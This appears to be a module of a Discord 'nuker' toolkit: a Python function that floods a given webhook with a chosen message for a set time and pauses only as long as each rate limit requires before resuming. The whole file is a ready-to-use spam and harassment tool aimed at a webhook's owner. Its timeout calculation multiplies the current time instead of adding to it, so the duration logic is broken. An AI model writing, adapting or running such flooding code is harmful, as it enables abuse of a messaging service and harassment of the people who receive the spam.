# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import requests
import json
import time
import Hazard
from time import sleep
from colorama import Fore

from util.plugins.common import print_slow

def WebhookSpammer(WebHook, Message, Timer):
    #get the amount of time to spam
    timeout = time.time() * float(Timer) + 1

    #spam the webhook with the message 
    while time.time() < timeout:
        response = requests.post(
            WebHook,
            json = {"content" : Message},
            params = {'wait' : True}
        )
        #check if the status got sent or if it got rate limited
        if response.status_code == 204 or response.status_code == 200:
            print(f"{Fore.GREEN}Message sent{Fore.RESET}")
        elif response.status_code == 429:
            print(f"{Fore.YELLOW}Rate limited ({response.json()['retry_after']}ms){Fore.RESET}")
            #if we got ratelimited, pause untill the rate limit is over
            sleep(response.json()["retry_after"] / 1000)
        else:
            print(f"{Fore.RED}Error : {response.status_code}{Fore.RESET}")

        sleep(.01)

    print_slow(f'{Fore.RED}Spammed Webhook Succesfully!{Fore.RESET} ')
    print("Enter anything to continue. . . ", end="")
    input()
    Hazard.main()